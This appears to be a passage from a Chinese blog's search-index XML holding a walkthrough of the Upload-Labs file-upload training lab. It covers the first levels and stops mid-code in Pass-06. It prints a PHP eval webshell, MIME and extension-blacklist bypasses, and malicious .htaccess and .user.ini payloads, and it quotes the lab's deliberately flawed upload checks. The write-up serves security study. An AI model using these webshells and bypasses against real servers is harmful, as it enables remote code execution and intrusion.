<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>文件上传漏洞总结 : Upload-Labs通关手册</title>
      <link href="/Study/post/Upload-Labs/"/>
      <url>/Study/post/Upload-Labs/</url>
      
        <content type="html"><![CDATA[<h1 id="Upload-Labs通关手册"><a href="#Upload-Labs通关手册" class="headerlink" title="Upload-Labs通关手册"></a>Upload-Labs通关手册</h1><br><h2 id="靶机环境"><a href="#靶机环境" class="headerlink" title="靶机环境"></a>靶机环境</h2><table><thead><tr><th>Software</th><th>NAME</th></tr></thead><tbody><tr><td>浏览器</td><td>Chrome</td></tr><tr><td>连接WebShell工具</td><td>AntSword</td></tr><tr><td>抓包工具</td><td>Burpsuite Pro</td></tr><tr><td>路由器代理插件</td><td>Proxy SwitchyOmega</td></tr></tbody></table><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-comment">#webshell代码</span><span class="hljs-meta">&lt;?php</span>    @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&quot;shell&quot;</span>]);<span class="hljs-meta">?&gt;</span></code></pre></div><br><h2 id="Upload-Labs题型总结"><a href="#Upload-Labs题型总结" class="headerlink" title="Upload-Labs题型总结"></a>Upload-Labs题型总结</h2><p><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/img/upload-labs%E9%A2%98%E5%9E%8B.png"></p><h2 id="Pass-01"><a href="#Pass-01" class="headerlink" title="Pass-01"></a>Pass-01</h2><blockquote><p>本pass在客户端使用js对不合法图片进行检查！</p></blockquote><div class="code-wrapper"><pre><code class="hljs javascript"><span class="hljs-comment">//JavaScript代码</span><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkFile</span>(<span class="hljs-params"></span>) </span>&#123;    <span class="hljs-keyword">var</span> file = <span class="hljs-built_in">document</span>.getElementsByName(<span class="hljs-string">&#x27;upload_file&#x27;</span>)[<span class="hljs-number">0</span>].value;    <span class="hljs-keyword">if</span> (file == <span class="hljs-literal">null</span> || file == <span class="hljs-string">&quot;&quot;</span>) &#123;        alert(<span class="hljs-string">&quot;请选择要上传的文件!&quot;</span>);        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;    &#125;    <span class="hljs-comment">//定义允许上传的文件类型</span>    <span class="hljs-keyword">var</span> allow_ext = <span class="hljs-string">&quot;.jpg|.png|.gif&quot;</span>;    <span class="hljs-comment">//提取上传文件的类型</span>    <span class="hljs-keyword">var</span> ext_name = file.substring(file.lastIndexOf(<span class="hljs-string">&quot;.&quot;</span>));    <span class="hljs-comment">//判断上传文件类型是否允许上传</span>    <span class="hljs-keyword">if</span> (allow_ext.indexOf(ext_name + <span class="hljs-string">&quot;|&quot;</span>) == -<span class="hljs-number">1</span>) &#123;        <span class="hljs-keyword">var</span> errMsg = <span class="hljs-string">&quot;该文件不允许上传，请上传&quot;</span> + allow_ext + <span class="hljs-string">&quot;类型的文件,当前文件类型为：&quot;</span> + ext_name;        alert(errMsg);        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;    &#125;&#125;</code></pre></div><h3 id="禁用JavaScript"><a href="#禁用JavaScript" class="headerlink" title="禁用JavaScript"></a>禁用JavaScript</h3><p>在网站设置里禁止JavaScript运行</p><p><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/img/%E7%A6%81%E7%94%A8JavaScript.png"></p><h3 id="修改JavaScript代码"><a href="#修改JavaScript代码" class="headerlink" title="修改JavaScript代码"></a>修改JavaScript代码</h3><p>在Console中修改JavaScript代码并执行即可,方法很多,只要绕过判断就行,我是将判断上传文件类型是否允许上传的”-1”改为”0”</p><p><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/img/%E4%BF%AE%E6%94%B9JavaScript%E4%BB%A3%E7%A0%81.png"></p><h3 id="解析上传的WebShell"><a href="#解析上传的WebShell" class="headerlink" title="解析上传的WebShell"></a>解析上传的WebShell</h3><p><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/img/%E8%BF%9E%E6%8E%A5%E8%9A%81%E5%89%91.png"></p><p><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/img/%E8%BF%9E%E6%8E%A5%E6%88%90%E5%8A%9F.png"></p><p>之后连接WebShell都是这个操作,后面就不演示了</p><br><h2 id="Pass-02"><a href="#Pass-02" class="headerlink" title="Pass-02"></a>Pass-02</h2><blockquote><p>本pass在服务端对数据包的MIME进行检查！</p></blockquote><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;    <span class="hljs-keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;        <span class="hljs-keyword">if</span> ((<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;type&#x27;</span>] == <span class="hljs-string">&#x27;image/jpeg&#x27;</span>) || (<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;type&#x27;</span>] == <span class="hljs-string">&#x27;image/png&#x27;</span>) || (<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;type&#x27;</span>] == <span class="hljs-string">&#x27;image/gif&#x27;</span>)) &#123;            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]                        <span class="hljs-keyword">if</span> (move_uploaded_file(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123;                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;            &#125; <span class="hljs-keyword">else</span> &#123;                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;            &#125;        &#125; <span class="hljs-keyword">else</span> &#123;            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;文件类型不正确，请重新上传！&#x27;</span>;        &#125;    &#125; <span class="hljs-keyword">else</span> &#123;        <span class="hljs-variable">$msg</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;    &#125;&#125;</code></pre></div><blockquote><p>MIME科普:<a href="https://baike.baidu.com/item/MIME/2900607?fr=aladdin#4">https://baike.baidu.com/item/MIME/2900607?fr=aladdin#4</a></p></blockquote><h3 id="设置burp代理"><a href="#设置burp代理" class="headerlink" title="设置burp代理"></a>设置burp代理</h3><p><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/img/%E8%AE%BE%E7%BD%AEburp%E4%BB%A3%E7%90%86.png"></p><h3 id="抓取数据包并修改数据"><a href="#抓取数据包并修改数据" class="headerlink" title="抓取数据包并修改数据"></a>抓取数据包并修改数据</h3><p>根据题目提示,修改数据包的Content-Type,符合JavaScript代码即可</p><p><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/img/Pass-02%E4%BF%AE%E6%94%B9%E6%95%B0%E6%8D%AE%E5%8C%85.png"></p><br><h2 id="Pass-03"><a href="#Pass-03" class="headerlink" title="Pass-03"></a>Pass-03</h2><blockquote><p>本pass禁止上传.asp|.aspx|.php|.jsp后缀文件！</p></blockquote><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;    <span class="hljs-keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;        <span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;.asp&#x27;</span>,<span class="hljs-string">&#x27;.aspx&#x27;</span>,<span class="hljs-string">&#x27;.php&#x27;</span>,<span class="hljs-string">&#x27;.jsp&#x27;</span>);        <span class="hljs-variable">$file_name</span> = trim(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);        <span class="hljs-variable">$file_name</span> = deldot(<span class="hljs-variable">$file_name</span>);<span class="hljs-comment">//删除文件名末尾的点</span>        <span class="hljs-variable">$file_ext</span> = strrchr(<span class="hljs-variable">$file_name</span>, <span class="hljs-string">&#x27;.&#x27;</span>);        <span class="hljs-variable">$file_ext</span> = strtolower(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//转换为小写</span>        <span class="hljs-variable">$file_ext</span> = str_ireplace(<span class="hljs-string">&#x27;::$DATA&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$file_ext</span>);<span class="hljs-comment">//去除字符串::$DATA</span>        <span class="hljs-variable">$file_ext</span> = trim(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//收尾去空</span>        <span class="hljs-keyword">if</span>(!in_array(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$deny_ext</span>)) &#123;            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.date(<span class="hljs-string">&quot;YmdHis&quot;</span>).rand(<span class="hljs-number">1000</span>,<span class="hljs-number">9999</span>).<span class="hljs-variable">$file_ext</span>;                        <span class="hljs-keyword">if</span> (move_uploaded_file(<span class="hljs-variable">$temp_file</span>,<span class="hljs-variable">$img_path</span>)) &#123;                 <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;            &#125; <span class="hljs-keyword">else</span> &#123;                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;            &#125;        &#125; <span class="hljs-keyword">else</span> &#123;            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;不允许上传.asp,.aspx,.php,.jsp后缀文件！&#x27;</span>;        &#125;    &#125; <span class="hljs-keyword">else</span> &#123;        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;    &#125;&#125;</code></pre></div><h3 id="黑名单绕过"><a href="#黑名单绕过" class="headerlink" title="黑名单绕过"></a>黑名单绕过</h3><p>使用 .php3 .php4 .php5.phtml 这些后缀的WebShell上传解析</p><p>前提是Apache的httpd-conf配置文件必须有</p><div class="code-wrapper"><pre><code class="hljs jboss-cli">AddType application/x-httpd-php <span class="hljs-string">.php</span> <span class="hljs-string">.phtml</span> <span class="hljs-string">.php3</span> <span class="hljs-string">.php4</span> <span class="hljs-string">.php5</span></code></pre></div><p><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/img/Pass-03%E8%BF%9E%E6%8E%A5webshell.png"></p><br><h2 id="Pass-04"><a href="#Pass-04" class="headerlink" title="Pass-04"></a>Pass-04</h2><blockquote><p>本pass禁止上传.php|.php5|.php4|.php3|.php2|php1|.html|.htm|.phtml|.pHp|.pHp5|.pHp4|.pHp3|.pHp2|pHp1|.Html|.Htm|.pHtml|.jsp|.jspa|.jspx|.jsw|.jsv|.jspf|.jtml|.jSp|.jSpx|.jSpa|.jSw|.jSv|.jSpf|.jHtml|.asp|.aspx|.asa|.asax|.ascx|.ashx|.asmx|.cer|.aSp|.aSpx|.aSa|.aSax|.aScx|.aShx|.aSmx|.cEr|.sWf|.swf后缀文件！</p></blockquote><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;    <span class="hljs-keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;        <span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;.php&quot;</span>,<span class="hljs-string">&quot;.php5&quot;</span>,<span class="hljs-string">&quot;.php4&quot;</span>,<span class="hljs-string">&quot;.php3&quot;</span>,<span class="hljs-string">&quot;.php2&quot;</span>,<span class="hljs-string">&quot;.php1&quot;</span>,<span class="hljs-string">&quot;.html&quot;</span>,<span class="hljs-string">&quot;.htm&quot;</span>,<span class="hljs-string">&quot;.phtml&quot;</span>,<span class="hljs-string">&quot;.pht&quot;</span>,<span class="hljs-string">&quot;.pHp&quot;</span>,<span class="hljs-string">&quot;.pHp5&quot;</span>,<span class="hljs-string">&quot;.pHp4&quot;</span>,<span class="hljs-string">&quot;.pHp3&quot;</span>,<span class="hljs-string">&quot;.pHp2&quot;</span>,<span class="hljs-string">&quot;.pHp1&quot;</span>,<span class="hljs-string">&quot;.Html&quot;</span>,<span class="hljs-string">&quot;.Htm&quot;</span>,<span class="hljs-string">&quot;.pHtml&quot;</span>,<span class="hljs-string">&quot;.jsp&quot;</span>,<span class="hljs-string">&quot;.jspa&quot;</span>,<span class="hljs-string">&quot;.jspx&quot;</span>,<span class="hljs-string">&quot;.jsw&quot;</span>,<span class="hljs-string">&quot;.jsv&quot;</span>,<span class="hljs-string">&quot;.jspf&quot;</span>,<span class="hljs-string">&quot;.jtml&quot;</span>,<span class="hljs-string">&quot;.jSp&quot;</span>,<span class="hljs-string">&quot;.jSpx&quot;</span>,<span class="hljs-string">&quot;.jSpa&quot;</span>,<span class="hljs-string">&quot;.jSw&quot;</span>,<span class="hljs-string">&quot;.jSv&quot;</span>,<span class="hljs-string">&quot;.jSpf&quot;</span>,<span class="hljs-string">&quot;.jHtml&quot;</span>,<span class="hljs-string">&quot;.asp&quot;</span>,<span class="hljs-string">&quot;.aspx&quot;</span>,<span class="hljs-string">&quot;.asa&quot;</span>,<span class="hljs-string">&quot;.asax&quot;</span>,<span class="hljs-string">&quot;.ascx&quot;</span>,<span class="hljs-string">&quot;.ashx&quot;</span>,<span class="hljs-string">&quot;.asmx&quot;</span>,<span class="hljs-string">&quot;.cer&quot;</span>,<span class="hljs-string">&quot;.aSp&quot;</span>,<span class="hljs-string">&quot;.aSpx&quot;</span>,<span class="hljs-string">&quot;.aSa&quot;</span>,<span class="hljs-string">&quot;.aSax&quot;</span>,<span class="hljs-string">&quot;.aScx&quot;</span>,<span class="hljs-string">&quot;.aShx&quot;</span>,<span class="hljs-string">&quot;.aSmx&quot;</span>,<span class="hljs-string">&quot;.cEr&quot;</span>,<span class="hljs-string">&quot;.sWf&quot;</span>,<span class="hljs-string">&quot;.swf&quot;</span>,<span class="hljs-string">&quot;.ini&quot;</span>);        <span class="hljs-variable">$file_name</span> = trim(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);        <span class="hljs-variable">$file_name</span> = deldot(<span class="hljs-variable">$file_name</span>);<span class="hljs-comment">//删除文件名末尾的点</span>        <span class="hljs-variable">$file_ext</span> = strrchr(<span class="hljs-variable">$file_name</span>, <span class="hljs-string">&#x27;.&#x27;</span>);        <span class="hljs-variable">$file_ext</span> = strtolower(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//转换为小写</span>        <span class="hljs-variable">$file_ext</span> = str_ireplace(<span class="hljs-string">&#x27;::$DATA&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$file_ext</span>);<span class="hljs-comment">//去除字符串::$DATA</span>        <span class="hljs-variable">$file_ext</span> = trim(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//收尾去空</span>        <span class="hljs-keyword">if</span> (!in_array(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$deny_ext</span>)) &#123;            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$file_name</span>;            <span class="hljs-keyword">if</span> (move_uploaded_file(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123;                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;            &#125; <span class="hljs-keyword">else</span> &#123;                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;            &#125;        &#125; <span class="hljs-keyword">else</span> &#123;            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;此文件不允许上传!&#x27;</span>;        &#125;    &#125; <span class="hljs-keyword">else</span> &#123;        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;    &#125;&#125;</code></pre></div><h3 id="重写解析规则"><a href="#重写解析规则" class="headerlink" title="重写解析规则"></a>重写解析规则</h3><blockquote><p>.htaccess文件:<a href="https://baike.baidu.com/item/htaccess">https://baike.baidu.com/item/htaccess</a></p></blockquote><p>上传覆盖.htaccess文件，重写解析规则，将上传的带马图片以脚本的方式解析。</p><p>创建.htaccess文件,为带马的a.jpg做php解析</p><div class="code-wrapper"><pre><code class="hljs ini">&lt;FilesMatch &quot;a.jpg&quot;&gt;SetHandler application/x-httpd-php&lt;/FilesMatch&gt;</code></pre></div><p>上传WebShell</p><p><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/img/Pass-04%E9%93%BE%E6%8E%A5webShell.png"></p><br><h2 id="Pass-05"><a href="#Pass-05" class="headerlink" title="Pass-05"></a>Pass-05</h2><blockquote><p>上传目录存在php文件（readme.php）</p></blockquote><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;    <span class="hljs-keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;        <span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;.php&quot;</span>,<span class="hljs-string">&quot;.php5&quot;</span>,<span class="hljs-string">&quot;.php4&quot;</span>,<span class="hljs-string">&quot;.php3&quot;</span>,<span class="hljs-string">&quot;.php2&quot;</span>,<span class="hljs-string">&quot;.html&quot;</span>,<span class="hljs-string">&quot;.htm&quot;</span>,<span class="hljs-string">&quot;.phtml&quot;</span>,<span class="hljs-string">&quot;.pht&quot;</span>,<span class="hljs-string">&quot;.pHp&quot;</span>,<span class="hljs-string">&quot;.pHp5&quot;</span>,<span class="hljs-string">&quot;.pHp4&quot;</span>,<span class="hljs-string">&quot;.pHp3&quot;</span>,<span class="hljs-string">&quot;.pHp2&quot;</span>,<span class="hljs-string">&quot;.Html&quot;</span>,<span class="hljs-string">&quot;.Htm&quot;</span>,<span class="hljs-string">&quot;.pHtml&quot;</span>,<span class="hljs-string">&quot;.jsp&quot;</span>,<span class="hljs-string">&quot;.jspa&quot;</span>,<span class="hljs-string">&quot;.jspx&quot;</span>,<span class="hljs-string">&quot;.jsw&quot;</span>,<span class="hljs-string">&quot;.jsv&quot;</span>,<span class="hljs-string">&quot;.jspf&quot;</span>,<span class="hljs-string">&quot;.jtml&quot;</span>,<span class="hljs-string">&quot;.jSp&quot;</span>,<span class="hljs-string">&quot;.jSpx&quot;</span>,<span class="hljs-string">&quot;.jSpa&quot;</span>,<span class="hljs-string">&quot;.jSw&quot;</span>,<span class="hljs-string">&quot;.jSv&quot;</span>,<span class="hljs-string">&quot;.jSpf&quot;</span>,<span class="hljs-string">&quot;.jHtml&quot;</span>,<span class="hljs-string">&quot;.asp&quot;</span>,<span class="hljs-string">&quot;.aspx&quot;</span>,<span class="hljs-string">&quot;.asa&quot;</span>,<span class="hljs-string">&quot;.asax&quot;</span>,<span class="hljs-string">&quot;.ascx&quot;</span>,<span class="hljs-string">&quot;.ashx&quot;</span>,<span class="hljs-string">&quot;.asmx&quot;</span>,<span class="hljs-string">&quot;.cer&quot;</span>,<span class="hljs-string">&quot;.aSp&quot;</span>,<span class="hljs-string">&quot;.aSpx&quot;</span>,<span class="hljs-string">&quot;.aSa&quot;</span>,<span class="hljs-string">&quot;.aSax&quot;</span>,<span class="hljs-string">&quot;.aScx&quot;</span>,<span class="hljs-string">&quot;.aShx&quot;</span>,<span class="hljs-string">&quot;.aSmx&quot;</span>,<span class="hljs-string">&quot;.cEr&quot;</span>,<span class="hljs-string">&quot;.sWf&quot;</span>,<span class="hljs-string">&quot;.swf&quot;</span>,<span class="hljs-string">&quot;.htaccess&quot;</span>);        <span class="hljs-variable">$file_name</span> = trim(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);        <span class="hljs-variable">$file_name</span> = deldot(<span class="hljs-variable">$file_name</span>);<span class="hljs-comment">//删除文件名末尾的点</span>        <span class="hljs-variable">$file_ext</span> = strrchr(<span class="hljs-variable">$file_name</span>, <span class="hljs-string">&#x27;.&#x27;</span>);        <span class="hljs-variable">$file_ext</span> = strtolower(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//转换为小写</span>        <span class="hljs-variable">$file_ext</span> = str_ireplace(<span class="hljs-string">&#x27;::$DATA&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$file_ext</span>);<span class="hljs-comment">//去除字符串::$DATA</span>        <span class="hljs-variable">$file_ext</span> = trim(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//首尾去空</span>        <span class="hljs-keyword">if</span> (!in_array(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$deny_ext</span>)) &#123;            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$file_name</span>;            <span class="hljs-keyword">if</span> (move_uploaded_file(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123;                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;            &#125; <span class="hljs-keyword">else</span> &#123;                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;            &#125;        &#125; <span class="hljs-keyword">else</span> &#123;            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;此文件类型不允许上传！&#x27;</span>;        &#125;    &#125; <span class="hljs-keyword">else</span> &#123;        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;    &#125;&#125;</code></pre></div><blockquote><p>.user.ini文件:<a href="https://www.php.net/manual/zh/configuration.file.per-user.php">https://www.php.net/manual/zh/configuration.file.per-user.php</a></p><p>Apache CGI配置:<a href="https://blog.csdn.net/zhuanshu666/article/details/74936940">https://blog.csdn.net/zhuanshu666/article/details/74936940</a></p></blockquote><h3 id="扩展php功能"><a href="#扩展php功能" class="headerlink" title="扩展php功能"></a>扩展php功能</h3><p>创建.user.ini文件,使得a,jpg的php代码加入上传目录的readme.php文件里</p><div class="code-wrapper"><pre><code class="hljs ini"><span class="hljs-attr">auto_prepend_file</span>=a.jpg</code></pre></div><p>创建a.jpg</p><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>phpinfo()    <span class="hljs-meta">?&gt;</span></code></pre></div><h3 id="访问readme-php"><a href="#访问readme-php" class="headerlink" title="访问readme.php"></a>访问readme.php</h3><p><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/img/Pass-05readme.php.png"></p><br><h2 id="Pass-06"><a href="#Pass-06" class="headerlink" title="Pass-06"></a>Pass-06</h2><blockquote><p>本pass禁止上传.php|.php5|.php4|.php3|.php2|php1|.html|.htm|.phtml|.pHp|.pHp5|.pHp4|.pHp3|.pHp2|pHp1|.Html|.Htm|.pHtml|.jsp|.jspa|.jspx|.jsw|.jsv|.jspf|.jtml|.jSp|.jSpx|.jSpa|.jSw|.jSv|.jSpf|.jHtml|.asp|.aspx|.asa|.asax|.ascx|.ashx|.asmx|.cer|.aSp|.aSpx|.aSa|.aSax|.aScx|.aShx|.aSmx|.cEr|.sWf|.swf|.htaccess后缀文件！</p></blockquote><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;    <span class="hljs-keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;        <span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;.php&quot;</span>,<span class="hljs-string">&quot;.php5&quot;</span>,<span class="hljs-string">&quot;.php4&quot;</span>,<span class="hljs-string">&quot;.php3&quot;</span>,<span class="hljs-string">&quot;.php2&quot;</span>,<span class="hljs-string">&quot;.html&quot;</span>,<span class="hljs-string">&quot;.htm&quot;</span>,<span class="hljs-string">&quot;.phtml&quot;</span>,<span class="hljs-string">&quot;.pht&quot;</span>,<span class="hljs-string">&quot;.pHp&quot;</span>,<span class="hljs-string">&quot;.pHp5&quot;</span>,<span class="hljs-string">&quot;.pHp4&quot;</span>,<span class="hljs-string">&quot;.pHp3&quot;</span>,<span class="hljs-string">&quot;.pHp2&quot;</span>,<span class="hljs-string">&quot;.Html&quot;</span>,<span class="hljs-string">&quot;.Htm&quot;</span>,<span class="hljs-string">&quot;.pHtml&quot;</span>,<span class="hljs-string">&quot;.jsp&quot;</span>,<span class="hljs-string">&quot;.jspa&quot;</span>,<span class="hljs-string">&quot;.jspx&quot;</span>,<span class="hljs-string">&quot;.jsw&quot;</span>,<span class="hljs-string">&quot;.jsv&quot;</span>,<span class="hljs-string">&quot;.jspf&quot;</span>,<span class="hljs-string">&quot;.jtml&quot;</span>,<span class="hljs-string">&quot;.jSp&quot;</span>,<span class="hljs-string">&quot;.jSpx&quot;</span>,<span class="hljs-string">&quot;.jSpa&quot;</span>,<span class="hljs-string">&quot;.jSw&quot;</span>,<span class="hljs-string">&quot;.jSv&quot;</span>,<span class="hljs-string">&quot;.jSpf&quot;</span>,<span class="hljs-string">&quot;.jHtml&quot;</span>,<span class="hljs-string">&quot;.asp&quot;</span>,<span class="hljs-string">&quot;.aspx&quot;</span>,<span class="hljs-string">&quot;.asa&quot;</span>,<span class="hljs-string">&quot;.asax&quot;</span>,<span class="hljs-string">&quot;.ascx&quot;</span>,<span class="hljs-string">&quot;.ashx&quot;</span>,<span class="hljs-string">&quot;.asmx&quot;</span>,<span class="hljs-string">&quot;.cer&quot;</span>,<span class="hljs-string">&quot;.aSp&quot;</span>,<span class="hljs-string">&quot;.aSpx&quot;</span>,<span class="hljs-string">&quot;.aSa&quot;</span>,<span class="hljs-string">&quot;.aSax&quot;</span>,<span class="hljs-string">&quot;.aScx&quot;</span>,<span class="hljs-string">&quot;.aShx&quot;</span>,<span class="hljs-string">&quot;.aSmx&quot;</span>,<span class="hljs-string">&quot;.cEr&quot;</span>,<span class="hljs-string">&quot;.sWf&quot;</span>,<span class="hljs-string">&quot;.swf&quot;</span>,<span class="hljs-string">&quot;.htaccess&quot;</span>,<span class="hljs-string">&quot;.ini&quot;</span>);        <span class="hljs-variable">$file_name</span> = trim(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);        <span class="hljs-variable">$file_name</span> = deldot(<span class="hljs-variable">$file_name</span>);<span class="hljs-comment">//删除文件名末尾的点</span>        <span class="hljs-variable">$file_ext</span> = strrchr(<span class="hljs-variable">$file_name</span>, <span class="hljs-string">&#x27;.&#x27;</span>);        <span class="hljs-variable">$file_ext</span> = str_ireplace(<span class="hljs-string">&#x27;::$DATA&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$file_ext</span>);<span class="hljs-comment">//去除字符串::$DATA</span>        <span class="hljs-variable">$file_ext</span> = trim(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//首尾去空</span>        <span class="hljs-keyword">if</span> (!in_array(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$deny_ext</span>)) &#123;            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.date(<span class="hljs-string">&quot;YmdHis&quot;</span>).rand(<span 